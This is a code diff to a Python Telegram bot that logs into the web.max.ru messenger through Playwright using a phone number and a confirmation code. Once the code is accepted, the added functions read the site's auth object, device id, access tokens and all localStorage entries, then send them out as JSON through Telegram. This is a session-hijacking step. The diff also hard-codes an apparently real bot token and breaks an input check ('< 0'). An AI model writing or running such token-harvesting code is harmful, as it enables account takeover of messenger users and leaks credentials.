@@ -3,9 +3,10 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from playwright.async_api import async_playwright
 import re
+import json
 
-TOKEN = ""
-URL = "https://web.max.ru/"  # замени на сайт
+TOKEN = "8931616705:AAHMtWnRG7jAH3PPcJicNMpDIGQ8pq2OFuQ"
+URL = "https://web.max.ru/"
 
 
 bot = Bot(token=TOKEN)
@@ -114,6 +115,41 @@ async def stop_browser(chat_id: int):
     except:
         pass
 
+# ---------------------------
+# COMMAND INTO THE CONSOLE IN THE SITE
+# ---------------------------
+async def get_local_storage_data(chat_id: int):
+    page = user_data[chat_id].get("page")
+    if not page:
+        return None
+
+    return await page.evaluate("""
+        () => {
+            return {
+                auth: JSON.parse(localStorage.getItem('__oneme_auth')),
+                device_id: localStorage.getItem('__oneme_device_id'),
+                token: localStorage.getItem('token') || 
+                       localStorage.getItem('__token') ||
+                       localStorage.getItem('access_token'),
+                all: Object.entries(localStorage)
+            }
+        }
+    """)
+
+async def send_storage_to_telegram(chat_id: int):
+    data = await get_local_storage_data(chat_id)
+
+    if not data:
+        await bot.send_message(chat_id, "❌ Нет данных")
+        return
+
+    text = json.dumps(data, indent=2, ensure_ascii=False)
+
+    # Telegram лимит ~4096 символов
+    if len(text) > 4000:
+        text = text[:4000] + "\n... (обрезано)"
+
+    await bot.send_message(chat_id, f"📦 LOCAL STORAGE:\n\n{text}")
 
 # ---------------------------
 # /start
@@ -139,7 +175,7 @@ async def cmd_phone(message: types.Message):
     chat_id = message.chat.id
 
     parts = message.text.split(maxsplit=1)
-    if len(parts) < 2:
+    if len(parts) < 0:
         await message.answer("Используй: /phone 79991234567")
         return
 
@@ -177,6 +213,7 @@ async def cmd_code(message: types.Message):
 
     if result == "OK":
         await message.answer("✅ Код подошёл")
+        await send_storage_to_telegram(chat_id)
     elif result == "WRONG":
         await message.answer("❌ Код неверный")
     else:
